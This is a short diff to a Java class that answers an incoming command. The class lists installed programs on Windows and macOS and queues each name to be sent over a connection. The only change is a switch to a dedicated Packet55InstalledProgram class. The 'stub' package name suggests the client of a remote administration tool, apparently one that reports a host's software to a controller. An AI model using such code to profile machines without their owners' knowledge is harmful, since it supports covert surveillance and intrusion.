@@ -6,7 +6,8 @@ import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet55InstalledProgram;
 
 
 public class PacketLISTINSTALL extends AbstractIncomingPacket {
@@ -32,13 +33,13 @@ public class PacketLISTINSTALL extends AbstractIncomingPacket {
 						if (line.startsWith("DisplayName")) {
 							String str = line.split("    ")[2];
 							if (!str.startsWith("@")) {
-								Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, str));
+								Connection.addToSendQueue(new Packet55InstalledProgram(str));
 							}
 						}
 					} else {
 						if (line.lastIndexOf("\\") != -1) {
 							String str = line.substring(line.lastIndexOf("\\") + 1, line.length());
-							Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, str));
+							Connection.addToSendQueue(new Packet55InstalledProgram(str));
 						}
 					}
 				}
@@ -51,7 +52,7 @@ public class PacketLISTINSTALL extends AbstractIncomingPacket {
 					
 					if (name.contains(".app")) {
 						name = name.replace(".app", "");
-						Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, app.getName()));
+						Connection.addToSendQueue(new Packet55InstalledProgram(app.getName()));
 					}
 				}
 			}
